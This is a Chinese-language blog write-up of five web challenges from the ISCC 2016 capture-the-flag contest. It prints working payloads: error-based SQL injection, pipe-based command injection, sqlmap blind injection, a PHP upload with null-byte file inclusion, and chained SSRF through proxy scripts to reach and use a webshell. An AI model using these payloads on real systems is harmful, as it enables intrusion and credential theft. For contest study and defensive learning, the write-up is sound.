---
layout: post
title: iscc2016 web writeup
category: writeup
tags: ctf
description:
---

[iscc2016][1]
-------------
 - 0x00 web150 flag in flag

提示：不同用户有着不同的权限，也许flag用户能够知道真正的flag内容，但他的密码很复杂呢……对了，如果情况不对，赶紧重置数据库后闪人啊。https://img.scanfsec.com/img/


訪問`index.php.txt`得到源碼.
user=flag
`if ($row[user] == "flag" && $user=="flag") {`
第25行
`$sql = "select user from user where pw='$pass'";`
pass直接拼接sql语句进行查询造成注入.
payload：`user=flag&pass=' and updatexml(1,concat(0x7e,(select pw from user limit 1,1 )),0)#`
![20160523152830.jpg][2]

然後用密碼直接登錄即可得到flag.

- 0x01 web 300 PING出事了吧
提示：我刚做了一个Ping命令的小工具，快来试一下吧.
第一感覺是拼接的系統命令.
發現一樣給了源碼/index.php.txt
`$pattern='/^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}(([&]{2}|[;|])dir[\sa-zA-Z0-9]*)?$/';`
可怕只能執行dir
`127.0.0.1|dir`得到目錄`1C9976C230DA289C1C359CD2A7C02D48`
然後在dir就能得到flag.php直接訪問就行
payload:`/1C9976C230DA289C1C359CD2A7C02D48/flag.php`

- 0x02 web 350 simple injection
小明老板经常嫌弃小明太懒了，这次老板给了小明一个简单的问题，解决不了就要被炒鱿鱼喽~
測試發現是延時注入.
sqlmap跑起來.`space2mysqlblank.py`
這裡要用官方給的ss 畢竟阿里雲.
![20160523155536.jpg][3]
小夥伴解出來是yinquesiting
然後就admin yinquesiting登錄就能看到flag

- 0x03 web 350 double kill
"没有什么防护是一个漏洞解决不了的，如果有，那
就.....
發現是一個上傳圖片并預覽的東西,上傳沒問題.
![20160523163420.jpg][4]

加了個單引號提示沒有找到文件,猜測可能是文件包含.
於是就上傳了圖片得到了圖片的ID
![QQ截图20160523163651.jpg][5]

然後在view得到圖片的位置.
![QQ截图20160523163720.jpg][6]

發現空白![QQ截图20160523164057.jpg][7]

猜測是不是過濾了什麼.
測試發現過濾了 ` <?php?> `
於是寫成了這個`<script language="php">phpinfo();</script>`
然後構造用%00截斷
payload:`/index.php?page=uploads/1463992925.jpg%00`
得到flag

-  0x04 web 500 糊涂的小明

小明入侵了一台web服务器并上传了一句话木马，但是，管理员修补了漏洞，更改了权限。更重要的是：他忘记了木马的密码！你能帮助他夺回控制权限吗？

點擊登錄發現注釋裏面有個`<!--<script>alert('admin ip is 121.42.171.222')</script>-->`提示。
以為是`X-Forwarded-For`發現我太年輕。
發現`121.42.171.222`直接訪問是403
然後發現那圖片有問題,使用了proxy.php腳本,於是想了想是不是用這個腳本來訪問`121.42.171.222`
![QQ截图20160523165720.jpg][8]

測試發現了這個也存在proxy腳本
![QQ截图20160523165825.jpg][9]

然後訪問了一下`/web4/proxy.php?url=http://121.42.171.222/proxy.php?url=http://101.200.145.44/web4/admin/robots.txt`
得到了
````
User-agent: *
Disallow:trojan.php
Disallow:trojan.php.txt
Disallow:check.php
Disallow:check.php.txt
````
trojan.php.txt是木馬打開看了看.
驗證了SESSION
`if($_SESSION['admin'])!='1'){exit('get out! hacker!');}`
然後我們去掉這個把php報錯打開.
![QQ截图20160523170321.jpg][10]

密碼360
然後在看看check.php.txt
user=admin
那就註冊admin看看 結果發現註冊不了,於是註冊Admin看看.
這裡你可以使用nginx做个反向代理
也可以直接審查元素改驗證碼地址和post包地址.
註冊登錄以後cookie複製到菜刀裏面
連接上去就能看到flag了.

-----------


  [1]: http://iscc.isclab.org.cn/
  [2]: https://img.scanfsec.com/img/2016054273952785.jpg
  [3]: https://img.scanfsec.com/img/2016051441739549.jpg
  [4]: https://img.scanfsec.com/img/201605415482793.jpg
  [5]: https://img.scanfsec.com/img/2016051720968178.jpg
  [6]: https://img.scanfsec.com/img/201605328086218.jpg
  [7]: https://img.scanfsec.com/img/2016052169943617.jpg
  [8]: https://img.scanfsec.com/img/2016053313397396.jpg
  [9]: https://img.scanfsec.com/img/2016058784887.jpg
  [10]: https://img.scanfsec.com/img/2016052867840389.jpg
